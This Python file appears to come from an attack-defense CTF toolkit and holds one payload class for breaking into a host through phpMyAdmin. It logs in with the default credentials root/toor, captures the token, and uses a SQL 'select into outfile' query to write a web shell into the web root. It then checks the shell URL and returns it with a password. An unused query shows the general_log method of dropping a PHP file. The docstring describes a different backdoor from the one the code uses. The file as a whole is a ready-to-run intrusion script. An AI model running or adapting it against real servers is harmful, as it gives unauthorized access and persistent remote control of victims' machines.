'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from configuration import configuration
from utils import Utils
from bs4 import BeautifulSoup

class P(Payload):
    def attack(self):
        username = 'root'
        password = 'toor'       
        try:
            # get token
            s = requests.Session()
            url = 'http://{}/phpMyAdmin/index.php'.format(self.host)
            res = s.get(url,timeout=2)
            soup = BeautifulSoup(res.text,'lxml')
            tokens = soup.find_all('input',{'type':'hidden','name':'token'})
            if not tokens:
                raise PayloadFailException
            token = tokens[0].get('value')
            if not token:
                raise PayloadFailException
            # login
            res = s.post(url,data={
                'pma_username':username,
                'pma_password':password,
                'server':1,
                'target':'index.php',
                'token':token
            },timeout=2)
            # select into outfile
            sqlUrl = 'http://{}/phpmyadmin/import.php'.format(self.host)
            horse = Horse(self.host)
            sql_query = "use mysql;set global general_log=ON;set global general_log_file='/var/www/html/uploads/tmp.php';select '<?php file_put_contents('');?>';"
            res = s.post(sqlUrl,data={
                'token':token,
                'sql_query':"select \"{}\" into outfile '{}{}'".format(horse.default,configuration.webRoot,configuration.shellLocations[0])
            },timeout=2)
            shellUrl = 'http://{}{}'.format(self.host,configuration.shellLocations[0])
            res = s.get(shellUrl)
            if res.status_code == 200:
                return shellUrl,Utils.getPassword(self.host)
        except Exception as e:
            # print(e)
            raise PayloadFailException
        raise PayloadFailException



